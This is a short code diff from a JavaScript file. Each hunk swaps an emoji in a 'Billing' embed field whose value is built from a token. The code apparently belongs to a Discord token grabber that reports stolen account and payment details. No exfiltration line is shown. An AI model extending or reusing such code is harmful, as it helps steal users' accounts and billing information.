@@ -394,7 +394,7 @@ xmlHttp.responseText`, !0).then((pm) => {
                         "inline": false
 },
 {
-    "name": " <a:nitro:942395826544705626> **Billing:**",
+    "name": "  <:billing:942396200831832124>  **Billing:**",
                             "value": `${PM(pm)}`,
                             "inline": false
     },
@@ -466,7 +466,7 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "inline": false
 },
 {
-    "name": " <a:nitro:942395826544705626> **Billing:**",
+    "name": "  <:billing:942396200831832124>  **Billing:**",
                             "value": `${PM(token)}`,
                             "inline": false
     },
@@ -533,7 +533,7 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "inline": false
 },
 {
-    "name": " <a:nitro:942395826544705626> **Billing:**",
+    "name": "  <:billing:942396200831832124>  **Billing:**",
                             "value": `${PM(token)}`,
                             "inline": false
     },
